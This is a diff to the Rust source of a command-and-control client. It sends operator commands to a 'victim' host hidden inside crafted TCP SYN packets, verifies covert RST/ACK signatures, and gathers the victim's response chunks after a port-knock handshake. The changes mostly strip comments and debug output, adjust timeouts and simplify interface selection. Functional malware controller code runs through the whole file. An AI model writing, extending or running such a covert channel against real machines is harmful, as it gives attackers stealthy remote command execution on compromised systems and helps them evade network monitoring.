@@ -1,7 +1,7 @@
 use std::io::{self, Write};
 use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::net::{TcpStream, IpAddr, Ipv4Addr};
+use std::net::{IpAddr, Ipv4Addr};
 use std::thread;
 use std::time::Duration;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
@@ -55,7 +55,6 @@ impl Commander {
         let victim_ip = self.victim_ip.expect("No victim IP");
         let local_ip = self.local_ip.expect("No local IP");
         
-        // Convert payload into stateful chunks
         let mut state = covert::SenderState::new_from_bytes(payload);
         
         let protocol = Layer3(IpNextHeaderProtocols::Tcp);
@@ -70,7 +69,6 @@ impl Commander {
                 while !acked && attempts < 5 {
                     attempts += 1;
                     
-                    // Build and send the SYN packet containing covert data
                     let syn_pkt = covert::build_syn_packet(
                         local_ip, victim_ip,
                         self.rx_port, self.tx_port, 
@@ -83,16 +81,9 @@ impl Commander {
                     );
 
                     let start = std::time::Instant::now();
-                    // Wait 500ms for the Victim to respond with the signature
-                    while start.elapsed() < Duration::from_millis(500) {
+                    while start.elapsed() < Duration::from_millis(800) {
                         if let Ok((packet, _)) = rx_iter.next() {
-                            // FIX: Use 'victim_ip' instead of 'target_ip'
                             if packet.get_source() == victim_ip {
-                                // Optional Debug: See the flags coming from the victim
-                                if let Some(tcp) = TcpPacket::new(packet.payload()) {
-                                     // println!("[DEBUG] Packet from Victim. Flags: {:b}", tcp.get_flags());
-                                }
-
                                 if let Some(recv_id) = covert::parse_rst_ack_signature(packet.packet()) {
                                     let expected_sig = covert::signature_ip_id(ip_id, raw_word);
                                     if recv_id == expected_sig {
@@ -111,7 +102,7 @@ impl Commander {
                 }
 
                 if !acked {
-                    println!("[!!!] Connection lost or Victim is not ACKing. Aborting command.");
+                    println!("[!!!] Connection lost. Aborting command.");
                     return;
                 }
             }
@@ -158,8 +149,6 @@ impl Commander {
         }
     }
 
-    // In main.rs
-
     fn initiate_connection(&mut self) {
         let target_ip_str = prompt("Target IP [127.0.0.1]: ");
         let ip = target_ip_str.parse::<Ipv4Addr>().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
@@ -171,30 +160,23 @@ impl Commander {
                 self.rx_port = session.rx_port;
                 self.knock_session = Some(session);
                 
-                // FIX: Identify local IP and interface properly
-                if let Some((iface_name, local_v4)) = Self::find_interface_for_target(ip) {
-                    println!("[*] Using interface: {} with IP: {}", iface_name, local_v4);
+                if let Some((_, local_v4)) = Self::find_interface_for_target(ip) {
                     self.local_ip = Some(local_v4);
                 } else {
-                    // Fallback to loopback if nothing else is found
-                    println!("[!] Warning: Could not find best interface, falling back to 127.0.0.1");
                     self.local_ip = Some(Ipv4Addr::new(127, 0, 0, 1));
                 }
 
                 self.running.store(true, Ordering::SeqCst);
                 self.state = SessionState::Connected;
                 self.spawn_listener(); 
-                println!("[+] Session Established.");
+                println!("[+] Session Established. Derived Ports -> TX: {}, RX: {}", self.tx_port, self.rx_port);
             }
             Err(e) => println!("[!] Knock failed: {}", e),
         }
     }
 
-    // Improved interface selection logic
     fn find_interface_for_target(target: Ipv4Addr) -> Option<(String, Ipv4Addr)> {
         let interfaces = datalink::interfaces();
-        
-        // 1. Try to find an interface that is in the same subnet
         for iface in &interfaces {
             for ip_net in &iface.ips {
                 if let IpAddr::V4(local_v4) = ip_net.ip() {
@@ -204,18 +186,6 @@ impl Commander {
                 }
             }
         }
-
-        // 2. Fallback: Find the first non-loopback up interface
-        for iface in &interfaces {
-            if iface.is_up() && !iface.is_loopback() {
-                for ip_net in &iface.ips {
-                    if let IpAddr::V4(local_v4) = ip_net.ip() {
-                        return Some((iface.name.clone(), local_v4));
-                    }
-                }
-            }
-        }
-
         None
     }
 
@@ -257,13 +227,8 @@ impl Commander {
     fn run_program(&mut self) {
         let cmd = prompt("Command: ");
         if !cmd.is_empty() {
-            println!("[*] Sending command...");
             self.send_covert_data(cmd.as_bytes());
-            
-            // 3️⃣ NOTIFY USER (Addresses point 3 of your analysis)
-            println!("[*] Command sent. Waiting for response from listener thread...");
-            // The output will be printed by the spawn_listener() thread 
-            // whenever the victim sends the response chunks back.
+            println!("[*] Command sent. Listening for response...");
         }
     }
 
@@ -273,13 +238,8 @@ impl Commander {
     }
     fn disconnect(&mut self) {
         self.running.store(false, Ordering::SeqCst);
+        if let Some(ref session) = self.knock_session { session.stop(); }
         self.state = SessionState::Disconnected;
-    }
-
-    fn find_best_interface(_target_ip: Ipv4Addr) -> Option<String> {
-        datalink::interfaces().into_iter()
-            .find(|i| i.is_up() && !i.is_loopback())
-            .map(|i| i.name)
     }
 }
 
